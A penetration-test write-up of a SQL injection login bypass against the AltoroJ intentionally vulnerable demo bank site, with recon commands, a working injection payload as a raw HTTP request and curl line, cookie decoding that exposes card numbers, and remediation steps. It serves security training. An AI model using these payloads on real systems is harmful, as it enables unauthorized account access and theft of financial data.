
# SQL Injection — Authentication Bypass (Admin Account Takeover)

**Target:** `demo.testfire.net` (AltoroJ — HCL AppScan demo banking application)
**Vulnerability Class:** SQL Injection → Authentication Bypass → Privilege Escalation (Admin)
**CWE:** CWE-89 (SQL Injection)
**Severity:** Critical
**Status:** Confirmed / Exploited

---

## Summary

The login endpoint `/doLogin` fails to sanitize or parameterize user-supplied input in the `uid` field before using it in a backend SQL query. By submitting a boolean-always-true SQL injection payload in place of a username, authentication is bypassed entirely — and in this case, the resulting session was authenticated as the **Admin User**, exposing a full account ledger (21+ accounts, including two full credit card PANs) and an administrative user-management panel.

---

## Reconnaissance

### 1. Service enumeration (nmap)

Confirmed the target stack as Apache Tomcat/Coyote (Java/JSP), not IIS/ASP.NET as initially assumed from the classic Altoro Mutual demo.

```
PORT     STATE  SERVICE   VERSION
80/tcp   open   http      Apache Tomcat/Coyote JSP engine 1.1
443/tcp  open   ssl/http  Apache Tomcat/Coyote JSP engine 1.1
8080/tcp open   http      Apache Tomcat/Coyote JSP engine 1.1
```

### 2. Content discovery (ffuf)

```bash
ffuf -u http://testfire.net/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
```

Notable hits (after excluding Windows reserved-name false positives — `con`, `nul`, `prn`, `aux`, `com1-3`, `lpt1-2`, which Windows/IIS-style servers return 200 for regardless of real existence):

```
admin     302
bank      302
images    302
static    302
util      302
pr        302
```

Follow-up fuzzing with a Tomcat-specific vuln wordlist once the stack was confirmed as Tomcat:

```bash
ffuf -u http://demo.testfire.net/FUZZ -w /usr/share/wordlists/dirb/vulns/tomcat.txt -mc 200,301,302,403 -t 40
```

---

## Exploitation

### 3. SQL injection payload — login bypass

**Request:**

```http
POST http://demo.testfire.net/doLogin HTTP/1.1
host: demo.testfire.net
Content-Type: application/x-www-form-urlencoded
content-length: 46
Referer: http://demo.testfire.net/login.jsp
Cookie: JSESSIONID=FE1A0A41C1F6ECB8D45F35895F46771A

uid=' or true--&passw=admin123&btnSubmit=Login
```

**Payload breakdown:**

| Field | Value | Purpose |
|---|---|---|
| `uid` | `' or true--` | Closes the string literal, injects an always-true condition, comments out the rest of the query (including the password check) |
| `passw` | `admin123` | Arbitrary — irrelevant due to the `--` comment |

**Response:**

```http
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Set-Cookie: AltoroAccounts="ODAwMDAwfkNvcnBvcmF0ZX4...[truncated]"; Version=1
Location: /bank/main.jsp
Content-Length: 0
```

A `302` redirect to `/bank/main.jsp` with a fresh `AltoroAccounts` session cookie confirms a successful authenticated session was established — with no valid credentials supplied.

**Reproducible via curl:**

```bash
curl -s -c cookies.txt -i -X POST http://demo.testfire.net/doLogin \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "uid=' or true--&passw=admin123&btnSubmit=Login"
```

> **Note on session handling:** the cookie jar must be reused unbroken from the login request through to subsequent authenticated requests. Letting the jar go stale, or sending a request with a pre-existing/mismatched `JSESSIONID`, caused Tomcat to reject the session and redirect back to `/login.jsp`.

---

### 4. Confirming authenticated access

```bash
curl -s -b cookies.txt http://demo.testfire.net/bank/main.jsp -o main.html
cat main.html
```

The response confirmed the session was authenticated **as the Admin User**:

```html
<h1>Hello Admin User</h1>
<p>Welcome to Altoro Mutual Online.</p>
```

...and exposed an administration panel not available to standard users:

```html
<b>ADMINISTRATION</b>
<ul class="sidebar">
    <li><a href="/admin/admin.jsp">Edit Users</a></li>
</ul>
```

---

### 5. Data exposure via the `AltoroAccounts` cookie

The `AltoroAccounts` cookie set on login is base64-encoded and, when decoded, discloses the full account ledger for the authenticated identity:

```bash
echo '<AltoroAccounts cookie value>' | base64 -d
```

**Decoded output (truncated):**

```
800000~Corporate~-1.0E35|800001~Checking~9.9893452641043E11|800002~Savings~9.999999910010056E34|
...
4539082039396288~Credit Card~-1.1844674407800565E20|4485983356242217~Credit Card~10100.97|
...
800021~Checking~0.0
```

**Impact of this disclosure:**
- 21+ account numbers and account types exposed
- **Two full 16-digit credit card numbers (PANs) exposed in plaintext** within a client-side cookie
- Balance values appear randomized/corrupted (standard for this test-harness data), but account structure and PAN exposure are real, reportable findings

---

## Impact

1. **Full authentication bypass** — no valid credentials required to obtain an authenticated session
2. **Privilege escalation to Admin** — the bypass landed in the highest-privilege account on the platform, exposing `/admin/admin.jsp` (user management)
3. **Sensitive data exposure** — full account ledger and credit card PANs disclosed via a client-readable session cookie
4. **Chained attack surface** — authenticated access also exposes further endpoints worth testing: `/bank/transfer.jsp` (funds transfer), `/bank/queryxpath.jsp` (known XPath injection point), `/swagger/index.html` (exposed REST API)

---

## Root Cause

User-supplied input (`uid`) is concatenated directly into a backend SQL query rather than being passed via a parameterized query / prepared statement, allowing arbitrary SQL control characters (`'`, `--`) to alter query logic.

## Remediation

- Use parameterized queries / prepared statements for all database access involving user input — never concatenate raw input into SQL strings
- Apply strict server-side input validation/allow-listing on login fields
- Do not store sensitive account/financial data (including PANs) in client-side cookies, even encoded — use opaque, server-side session references instead
- Enforce least-privilege session establishment — a successful authentication should never default to or be capable of resolving to an administrative identity via injected logic
- Implement WAF/input filtering as a defense-in-depth layer (not a substitute for the above)

---

## Disclosure Note

`demo.testfire.net` is **AltoroJ**, HCL's intentionally vulnerable open-source demo banking application, used to showcase AppScan's detection capabilities. Source is publicly available at [github.com/AppSecDev/AltoroJ](https://github.com/AppSecDev/AltoroJ). This application is designed to contain this vulnerability for training/demonstration purposes — findings here are not a real-world disclosure.
